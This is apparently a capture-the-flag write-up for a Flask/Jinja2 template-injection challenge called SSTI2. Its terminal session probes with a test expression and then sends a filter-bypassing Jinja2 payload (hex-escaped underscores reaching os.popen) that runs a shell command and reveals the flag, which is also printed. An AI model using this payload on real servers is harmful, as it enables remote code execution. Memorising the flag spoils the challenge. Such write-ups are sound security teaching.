## Descripción
I made a cool website where you can announce whatever you want! I read about input sanitization, so now I remove any kind of characters that could be a problem :) I heard templating is a cool and modular way to build web apps! Check out my website [here](http://chatelaine.cylabacademy.net:40454/)!
## Solución
```
┌──(kali㉿kali)-[~]
└─$ BASE="http://chatelaine.cylabacademy.net:48461"
                                                                                                                   
┌──(kali㉿kali)-[~]
└─$ curl -i "$BASE/"
HTTP/1.1 200 OK
Server: Werkzeug/3.0.3 Python/3.12.3
Date: Fri, 02 Oct 2026 02:29:42 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 567
Connection: close


                <!doctype html>
                <title>SSTI2</title>

                <h1> Home </h1>

                <p> I built a cool website that lets you announce whatever you want!* </p>

                <form action="/" method="POST">
                What do you want to announce: <input name="content" id="announce"> <button type="submit"> Ok </button>
                </form>
                
                <p style="font-size:10px;position:fixed;bottom:10px;left:10px;"> *Announcements may only reach yourself </p>
                                                                                                                                                         
┌──(kali㉿kali)-[~]
└─$ curl -s -c cookies.txt -b cookies.txt -L -X POST "$BASE/" --data-urlencode 'content={{5+5}}'

                    <!doctype html>
                    <h1 style="font-size:100px;" align="center">10</h1>                                                                                                                   
┌──(kali㉿kali)-[~]
└─$ curl -s -c cookies.txt -b cookies.txt -L -X POST "$BASE/" --data-urlencode "content={{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()}}"

                    <!doctype html>
                    <h1 style="font-size:100px;" align="center">academy{sst1_f1lt3r_byp4ss_d6571c77}</h1>
```
Solución:
academy{sst1_f1lt3r_byp4ss_d6571c77}
## Notas adicionales

## Referencias
